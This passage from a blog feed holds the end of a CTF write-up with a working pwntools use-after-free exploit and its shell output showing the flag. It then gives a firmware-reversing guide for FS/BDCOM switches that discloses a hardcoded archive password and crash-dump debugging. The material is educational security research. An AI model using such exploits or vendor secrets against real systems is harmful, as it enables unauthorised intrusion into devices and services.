</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">local_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="n">rem</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">rem</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;188.166.172.138&#34;</span><span class="p">,</span> <span class="mi">31900</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">pty</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">pty</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;do? &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">io</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">make_offer</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>       <span class="c1"># make offer</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;offer(y/n): &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#io.recvuntil(b&#39;do ? &#39;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">),</span> <span class="s1">&#39;ascii&#39;</span><span class="p">))</span>      <span class="c1"># chunk size</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#io.recvuntil(b&#39;me ? &#39;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#io.recvuntil(b&#39;do ? &#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">steal</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>       <span class="c1"># free</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;do? &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">unlock_storage</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p16</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">init</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;allocating chunk&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">make_offer</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lodsjhfjdsjfjdsfl&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;freeing storage&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">steal</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;allocating new chunk and overwritting printStorage&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">make_offer</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">72</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;profit...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><pre tabindex="0"><code>[+] Opening connection to 188.166.172.138 on port 31900: Done
allocating chunk
freeing storage
allocating new chunk and overwritting printStorage
profit...
[*] Switching to interactive mode

* Storage Door Opened *
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
HTB{tr1ck1ng_d3al3rz_f0r_fUn_4nd_pr0f1t}
</code></pre>]]></content>
		</item>
		
		<item>
			<title>Reversing Firmwares from FS and BDCOM Switches</title>
			<link>https://matth.dmz42.org/posts/2022/reversing-firmwares-from-fs-and-bdcom-switches/</link>
			<pubDate>Tue, 11 Jan 2022 15:24:31 +0100</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2022/reversing-firmwares-from-fs-and-bdcom-switches/</guid>
			<description>I recently had to buy a new 24x1G fanless switch for my home network. I had a mikrotik switch for years (which i was happy with but suffered a power surge) and wanted to try something new so I ended up with a FS S3700-24T4F.
Their CLI is close to Cisco&amp;rsquo;s IOS, it&amp;rsquo;s overall a fun device for home network and not too expensive. Found few small bugs here and there without really looking for them but in the end nothing too annoying in my context.</description>
			<content type="html"><![CDATA[<p>I recently had to buy a new 24x1G fanless switch for my home network. I had a mikrotik switch for years (which i was happy with but suffered a power surge) and wanted to try something new so I ended up with a <a href="https://www.fs.com/de-en/products/84912.html">FS S3700-24T4F</a>.</p>
<p>Their CLI is close to Cisco&rsquo;s IOS, it&rsquo;s overall a fun device for home network and not too expensive.
Found few small bugs here and there without really looking for them but in the end nothing too annoying in my context.</p>
<p>Looking at the form factor and the number of BDCOM reference in the firmware, it&rsquo;s most likely a rebranded BDCOM S2528-C.</p>
<h1 id="1-scope">1. Scope</h1>
<p>The following seems applicable to most <a href="https://www.bdcom.cn/">BDCOM</a> switches and to <a href="https://www.fs.com/">FS</a> S3150, S3260, S3400 and S3700 (rebranded BDCOM ?)
This is not a full analysis of the firmware, but that should be enough information to easily get started with reversing them.</p>
<h1 id="2-first-look">2. First look</h1>
<p>You can either get the firmware straight from the switch via TFTP (i had issue with SCP) or from their websites:</p>
<ul>
<li>BDCOM: <a href="https://sites.google.com/bdcom.cn/international/download/firmware/switch">https://sites.google.com/bdcom.cn/international/download/firmware/switch</a></li>
<li>FS: <a href="https://img-en.fs.com/file/user_manual/poe+-series-switches-fsos-v2-2-0d-a79995-software.zip">https://img-en.fs.com/file/user_manual/poe+-series-switches-fsos-v2-2-0d-a79995-software.zip</a></li>
</ul>
<p>There&rsquo;s usually 2 files:</p>
<pre tabindex="0"><code>Switch#dir
Directory of /:
1    Switch.bin             &lt;FILE&gt;     4352907    THU JAN 01 00:02:10 1970
0    web.wrp                &lt;FILE&gt;       30740    THU JAN 01 00:02:13 1970
</code></pre><ul>
<li><code>Switch.bin</code> is the actual firmware</li>
<li><code>web.wrp</code> is a password protected rar containing some branding/customs for the web interface</li>
</ul>
<pre tabindex="0"><code>% file Switch.bin web.wrp
Switch.bin: data
web.wrp:    RAR archive data, v2.0, os: Win32

% unrar l web.wrp      

UNRAR 6.10 beta 2 freeware      Copyright (c) 1993-2021 Alexander Roshal

Archive: web.wrp
Details: RAR 4

 Attributes      Size     Date    Time   Name
----------- ---------  ---------- -----  ----
*   I.A....       660  2021-01-08 15:17  cn.png
*   I.A....       674  2021-01-08 15:17  en.png
*   I.A....     52920  2021-01-08 15:17  extipaclitem.asp
*   I.A....       824  2021-01-08 15:17  footer.asp
*   I.A....      1795  2021-01-08 15:17  icon.png
*   I.A....      1141  2021-01-08 15:17  index.asp
*   I.A....     37192  2021-01-08 15:17  logo.asp
*   I.A....      1057  2021-01-08 15:17  logo.gif
*   I.A....      2594  2021-01-08 15:17  nav.png
*   I.A....     36188  2021-01-08 15:18  navbar.asp
*   I.A....      9753  2021-01-08 15:17  nav_style.css
*   I.A....      3899  2021-01-08 15:17  tabctrl.asp
----------- ---------  ---------- -----  ----
               148697                    12
</code></pre><h1 id="3-extracting-switchbin">3. Extracting Switch.bin</h1>
<p>The <code>Switch.bin</code> has 2 parts.<br>
The first part starts with the magic &ldquo;BDCO\x00&rdquo; and possibly contains some informations like base address and maybe some code responsible for loading the rest of the firmware (unconfirmed).</p>
<p>The 2nd part starts at offset 0x2030 and is identified by a &ldquo;SYS\x00&rdquo; marker.
At offset 0x2040 is a rar file.</p>
<pre tabindex="0"><code>% hexdump -C Switch.bin  | more
--- 1st part ---
00000000  42 44 43 4f 00 00 00 03  80 00 80 00 80 00 80 00  |BDCO............|
00000010  00 40 16 a2 00 00 20 40  02 02 00 44 07 e5 00 02  |.@.... @...D....|
00000020  05 0e 19 0f ee 3f 5a 73  00 00 00 00 00 00 00 02  |.....?Zs........|
00000030  00 02 1e fd 00 02 8c 12  00 02 78 c9 00 02 e8 92  |..........x.....|
00000040  00 02 ba 94 00 02 45 f6  00 02 c3 5f 00 02 90 f1  |......E...._....|
00000050  00 02 4d d1 00 00 f6 ed  00 00 fc 89 00 00 f8 d9  |..M.............|
00000060  00 02 b5 32 00 02 cd b6  00 02 bd c6 00 02 a4 69  |...2...........i|
00000070  00 02 d5 cf 00 02 0f f2  00 01 a8 41 00 02 e8 cc  |...........A....|
00000080  00 01 12 e7 00 01 18 d2  00 02 13 de 00 01 f6 07  |................|
00000090  00 02 2e ba 00 02 7f 17  00 01 1d b7 00 01 6a 1c  |..............j.|
000000a0  00 00 ec 16 00 00 6e 61  00 00 e0 3e 00 00 cf 58  |......na...&gt;...X|
000000b0  00 00 c7 e1 00 00 e2 29  00 00 00 00 00 00 00 00  |.......)........|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001030  cd 67 79 69 ec a8 3e d3  41 66 81 8c b9 2c 6d 10  |.gyi..&gt;.Af...,m.|
00001040  4a db 4a 70 07 49 f0 fd  88 97 71 06 c1 8f d2 59  |J.Jp.I....q....Y|
00001050  4d 92 e6 b3 fc 3f 46 a6  cc 7d 25 b3 96 b4 41 8d  |M....?F..}%...A.|
00001060  c8 8d a7 f6 94 54 80 86  b3 47 aa ff a8 dc 73 09  |.....T...G....s.|
00001070  f5 60 4e 8c 00 00 00 00  00 00 00 00 00 00 00 00  |.`N.............|
00001080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
--- 2nd part ---
00002030  53 59 53 00 00 00 00 00  00 00 00 00 00 00 00 00  |SYS.............|
--- RAR file ---
00002040  52 61 72 21 1a 07 00 cf  90 73 00 00 0d 00 00 00  |Rar!.....s......|
00002050  00 00 00 00 e0 8d 74 80  80 25 00 c4 1e 02 00 00  |......t..%......|
00002060  00 08 00 02 53 ed 8e e8  28 73 45 52 14 33 05 00  |....S...(sER.3..|
</code></pre><p>While this is true for most the files i could get my hands on, some of them like <code>FSOS_2.2.0D_75857.bin</code> are different:</p>
<ul>
<li>no rar file at 0x2040</li>
<li>1st part contains more data (i mean less NULL bytes)
hence my previous assumption about the first part of the bin file.</li>
</ul>
<p>the following will split the first part and the rar file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;out_1.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp_out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">fp_out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x2030</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;SYS</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;out_2.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp_out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">fp_out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></div><pre tabindex="0"><code>% ./extract.py Switch.bin 
% unrar l out_2.bin 

UNRAR 6.10 beta 2 freeware      Copyright (c) 1993-2021 Alexander Roshal

Archive: out_2.bin
Details: RAR 4

 Attributes      Size     Date    Time   Name
----------- ---------  ---------- -----  ----
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    524288  2021-02-05 14:25  .temp
    ..A....    399232  2021-02-05 14:25  .temp
Corrupt header is found
----------- ---------  ---------- -----  ----
             17700736                    34
</code></pre><p>all files in the archive (except the last) are 0x80000 bytes.
The archive can be extracted using <code>unrar -or</code> which will rename conflicting filenames</p>
<pre tabindex="0"><code>% unrar -or x out_2.bin 

UNRAR 6.10 beta 2 freeware      Copyright (c) 1993-2021 Alexander Roshal


Extracting from out_2.bin

Extracting  .temp                                                     OK 
Extracting  (1).temp                                                  OK 
Extracting  (2).temp                                                  OK 
[...]
Extracting  (33).temp                                                 OK 
Corrupt header is found
Total errors: 34
</code></pre><p>all that&rsquo;s left to do now is to concatenate all the extracted files:</p>
<pre tabindex="0"><code>% mv .temp \(0\).temp
% for x in $(seq 0 33); do cat \($x\).temp &gt;&gt; extracted_firmware.bin; done
% ls -h extracted_firmware.bin
17M extracted_firmware.bin
</code></pre><h1 id="4-disassembling">4. Disassembling</h1>
<p>According to the <a href="https://img-en.fs.com/file/datasheet/s3700-24t4f-switch-datasheet.pdf">datasheet</a>, the switch runs on a Realtek RTL8382M SoC and a MIPS 4kEC processor.</p>
<p>The base address is 0x80008000.</p>
<p>It can be obtained from the switch with the <code>show version</code> command:</p>
<pre tabindex="0"><code>Switch#show version
Fiberstore Co., Limited Internetwork Operating System Software
S3700-24T4F Series Software, Version 2.2.0D Build 80921, RELEASE SOFTWARE
Copyright (c) 2019 by FS.COM All Rights Reserved
Compiled: 2021-2-5 14:25:15 by SYS, Image text-base: 0x80008000        &lt;----- HERE
ROM: System Bootstrap, Version 0.5.2,hardware version:A
</code></pre><p>i suspect it&rsquo;s also in the 1st part of the Switch.bin file:</p>
<pre tabindex="0"><code>% hexdump -C Switch.bin| head -1
00000000  42 44 43 4f 00 00 00 03  80 00 80 00 80 00 80 00  |BDCO............|
                                   |  here?  | | or here?|
</code></pre><p>It loads fine in Ghidra:</p>
<ul>
<li>langage: MIPS:BE:32:default:default</li>
<li>base address: 0x80008000</li>
</ul>
<p><img src="ghidra_mips.png" alt="ghidra_mips.png"></p>
<p><img src="ghidra_address.jpg" alt="ghidra_address.jpg"></p>
<p>From there everything is smooth.</p>
<p><img src="ghidra_disasm.jpg" alt="ghidra_disasm.jpg"></p>
<p>even the decompiler works quite fine:</p>
<p><img src="ghidra_decomp.jpg" alt="ghidra_decomp.jpg"></p>
<h1 id="5-quick-analysis-for-fun">5. Quick Analysis For Fun</h1>
<h2 id="51-decrypting-type-7-passwords">5.1 Decrypting Type 7 Passwords</h2>
<p>By default, passwords are in clear text in the config, however you can change that by using <code>service password-encryption</code>.<br>
I made a tool to decrypt/encrypt such passwords, which is available <a href="https://github.com/matthw/fs_switch_type_7_password_decoder">here</a>.</p>
<h2 id="52-webwrp">5.2 web.wrp</h2>
<p>Since all strings references are correct, if we search for <code>web.wrp</code> we see it&rsquo;s only referenced in a single function.<br>
Doesn&rsquo;t take much work from here to figure the password for the rar file is <code>bdcom312</code></p>
<p><img src="rar_password.jpg" alt="rar_password.jpg"></p>
<pre tabindex="0"><code>% unrar x -pbdcom312 ../web.wrp

UNRAR 6.10 beta 2 freeware      Copyright (c) 1993-2021 Alexander Roshal


Extracting from ../web.wrp

Extracting  cn.png                                                    OK 
Extracting  en.png                                                    OK 
Extracting  extipaclitem.asp                                          OK 
Extracting  footer.asp                                                OK 
Extracting  icon.png                                                  OK 
Extracting  index.asp                                                 OK 
Extracting  logo.asp                                                  OK 
Extracting  logo.gif                                                  OK 
Extracting  nav.png                                                   OK 
Extracting  navbar.asp                                                OK 
Extracting  nav_style.css                                             OK 
Extracting  tabctrl.asp                                               OK 
All OK
</code></pre><h2 id="53-http-server">5.3 HTTP Server</h2>
<p>It uses <a href="https://www.embedthis.com/goahead/">GoAhead-Webs</a> version 2.1.8 which is a popular http server for embedded devices.<br>
This particular version can be found <a href="https://github.com/trenta3/goahead-versions">here</a>.</p>
<p>There&rsquo;s an ASP style server page.</p>
<p>All ASP functions are registered like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">ASP_register_all_functions</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateWebTitleInfoJS_80ce14c8</span><span class="p">,</span><span class="n">FUN_809a4bd0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateAboutInfoJS_80ce14e4</span><span class="p">,</span><span class="n">FUN_809a4de0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateWebParamsJS_80ce14fc</span><span class="p">,</span><span class="n">FUN_8095d068</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateUserPrivilegeJS_80ce1514</span><span class="p">,</span><span class="n">FUN_8096c908</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateRingInterfaceInfoJS_80ce1530</span><span class="p">,</span><span class="n">FUN_8097f680</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateInterfaceInfoJS_80ce1550</span><span class="p">,</span><span class="n">FUN_80964138</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateSystemStateJS_80ce156c</span><span class="p">,</span><span class="n">FUN_8095d24c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateRangeOfVariableJS_80ce1588</span><span class="p">,</span><span class="n">FUN_8095d700</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateUMJS_80ce15a8</span><span class="p">,</span><span class="n">FUN_8095d758</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateFunctionGobackUrlJS_80ce15b8</span><span class="p">,</span><span class="n">FUN_8095deb0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// [...]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateDhcpdIPBindInfoJS_80ce2e1c</span><span class="p">,</span><span class="n">FUN_80980c58</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASP_register_one_func</span><span class="p">(</span><span class="n">s_aspGenerateAccessRestrictInfoJS_80ce2e3c</span><span class="p">,</span><span class="n">FUN_8098c904</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The same with all forms actions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">http_register_all_goform_funcs</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_formTest_80cd9c5c</span><span class="p">,</span><span class="n">http_asp_formTest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_langform_80cd9c68</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_8092cb9c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_WebAdminDelete_80cd9c74</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_8092d4c4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_WebAdminConfig_80cd9c84</span><span class="p">,</span><span class="n">FUN_8092d790</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_SysClockConfig_80cd9c94</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_8092dca0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_BackupFirmware_80cd9ca4</span><span class="p">,</span><span class="n">FUN_8092e37c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_UpdateFirmware_80cd9cb4</span><span class="p">,</span><span class="n">FUN_8092e400</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_BackupConfigFile_80cd9cc4</span><span class="p">,</span><span class="n">FUN_8092e540</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_UpdateConfigFile_80cd9cd8</span><span class="p">,</span><span class="n">FUN_8092e5ac</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// [...]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_RestoreConfigFile_80cd9cec</span><span class="p">,</span><span class="n">FUN_8092e898</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_RebootDevice_80cd9d00</span><span class="p">,</span><span class="n">FUN_8092e7cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_CustomerinfoRestoreConfig_80cdaa68</span><span class="p">,</span><span class="n">FUN_8092f858</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">http_register_one_goform_func</span><span class="p">(</span><span class="n">s_AccessRestrictConfig_80cdaa84</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_8093dc90</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The HTTP code is easy to follow, especially with the source code next to it&hellip;</p>
<h1 id="6-debugging">6. Debugging</h1>
<p>It&rsquo;s possible to enable core dump (<code>core_dump enable</code>) and read core files with <code>show break</code> (should you crash the switch :-):</p>
<pre tabindex="0"><code>Switch#show break
=========================================================
BreakNum: 1
Exception Type:2-TLB miss exception (load or instruction fetch)
TaskID=826380b0, TaskName=HTTD
date: 2021-8-25  time: 17:13:23
zero at v0 v1
00000000 811c0000 00000016 00000af2
a0 a1 a2 a3
80cdd9f4 00000000 8099d5fc 00000000
t0 t1 t2 t3
00000000 1000fc00 1000fc01 00005000
t4 t5 t6 t7
00000140 00000002 02beff43 00000000
s0 s1 s2 s3
